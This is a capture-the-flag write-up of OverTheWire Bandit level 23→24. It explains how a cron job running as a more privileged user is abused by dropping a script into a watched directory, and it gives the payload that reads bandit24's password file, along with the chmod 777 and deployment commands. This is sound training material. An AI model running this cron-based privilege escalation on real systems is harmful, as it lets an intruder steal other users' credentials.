# Bandit Level 23 → Level 24

**Platform:** OverTheWire  
**Wargame:** Bandit  
**Date Completed:** 2026-05-11  
**Tags:** `cron` `bash-scripting` `script-writing` `file-permissions` `privilege-escalation`

---

## Objective

A cron job running as bandit24 executes and then deletes every script it finds in `/var/spool/bandit24/foo` that is owned by bandit23. Write a script that reads bandit24's password and writes it to a location you can access, place it in the watched directory, and wait for the cron job to execute it on your behalf.

---

## Concepts Learned

- **Writing and deploying a shell script:** This is the first level that requires you to write your own script and have it executed by a privileged process. Understanding how to structure a Bash script, make it executable, and place it where the privileged job will find it is directly applicable to real-world automation and security work.
- **`shopt -s nullglob`:** A shell option that causes glob patterns (like `*`) to expand to nothing rather than literally `*` when no files match. This prevents the loop in the cron script from attempting to process a file literally named `*` when the directory is empty.
- **`stat --format "%U"`:** Extracts the owning username of a file. The cron script uses this to verify that only scripts owned by bandit23 are executed - a safety check that also defines the constraint you must satisfy.
- **`timeout -s 9 60`:** Runs a command with a maximum time limit of 60 seconds, sending signal 9 (SIGKILL) if it exceeds that. This prevents a runaway or malicious script from hanging the cron job indefinitely.
- **Directory permissions for script drop zones:** The `/var/spool/bandit24/foo` directory must be writable so you can deposit your script. Your output directory in `/tmp` must also be writable by bandit24 so the script can write the password there. Setting `chmod 777` on your temp directory ensures this.
- **`chmod +x`:** Adds the executable bit to a file. A script that is not executable will not run - the cron job checks for this with `-f "$i"` but your script must also have execute permission for `timeout` to invoke it correctly.

---

## Approach

I started by reading the cron job definition and then the script it ran as bandit24:

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

Breaking this down:

- `shopt -s nullglob` - prevents the loop from misbehaving on an empty directory.
- `cd /var/spool/"$myname"/foo` - the job changes into the watched directory (`/var/spool/bandit24/foo` when run as bandit24).
- The `for` loop iterates over every file in that directory, including hidden ones (`* .*`).
- `stat --format "%U" "./$i"` - checks the owner of each file.
- `if [ "${owner}" = "bandit23" ]` - only executes files owned by bandit23. Since I am logged in as bandit23, any file I create satisfies this condition.
- `timeout -s 9 60 "./$i"` - runs the script for up to 60 seconds.
- `rm -rf "./$i"` - deletes every file after processing, regardless of whether it was executed.

With the script's logic understood, my plan was clear: write a script as bandit23, place it in `/var/spool/bandit24/foo`, and wait for the cron job to execute it as bandit24.

I created a working directory in `/tmp` with `mkdir`, set it to `chmod 777` so bandit24 could write into it, then wrote the following script:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mydirectory/password.txt
chmod 644 /tmp/mydirectory/password.txt
```

I made the script executable with `chmod +x`, copied it into `/var/spool/bandit24/foo/`, and waited. Within a minute the cron job ran, executed my script as bandit24, and wrote the password to my temp file. I read it with `cat`.

---

## Commands Used

```bash
# Check system cron jobs and read the relevant script
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

# Create a working directory and make it world-writable
mkdir /tmp/mydirectory
chmod 777 /tmp/mydirectory

# Write the script
nano /tmp/mydirectory/myscript.sh
# Content:
# #!/bin/bash
# cat /etc/bandit_pass/bandit24 > /tmp/mydirectory/password.txt
# chmod 644 /tmp/mydirectory/password.txt

# Make the script executable
chmod +x /tmp/mydirectory/myscript.sh

# Deploy the script to the watched directory
cp /tmp/mydirectory/myscript.sh /var/spool/bandit24/foo/myscript.sh

# Wait up to one minute, then read the output
cat /tmp/mydirectory/password.txt
```

---

## Reflection

This level is a significant step up - it moves from passively reading what a privileged process leaves behind to actively injecting code into a privileged execution pipeline. The pattern of dropping a script into a watched directory and waiting for a privileged process to run it maps directly to real-world privilege escalation techniques involving writable cron script paths, writable `PATH` entries, and insecure file drop zones.

The permission setup was the most detail-intensive part: the script must be owned by bandit23 (satisfied automatically), executable (requires `chmod +x`), and the output directory must be writable by bandit24 (requires `chmod 777` on the temp directory). Missing any one of these would cause the attack to silently fail.

---

## Key Takeaway

Writable directories monitored by privileged cron jobs are a classic and high-value privilege escalation vector. The methodology here - read the cron job, understand the script, identify the constraints, craft a payload, deploy it, and wait - is a direct rehearsal of how cron-based privilege escalation works in real Linux environments. Permission management at every step is critical: one missing bit causes the entire chain to silently break.

---

## References

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
- [Linux man page - `cron`](https://linux.die.net/man/8/cron)
- [Linux man page - `chmod`](https://linux.die.net/man/1/chmod)
- [Linux man page - `stat`](https://linux.die.net/man/1/stat)
- [Bash manual - The `shopt` builtin](https://www.gnu.org/software/bash/manual/bash.html#The-Shopt-Builtin)
- [Linux man page - `timeout`](https://linux.die.net/man/1/timeout)
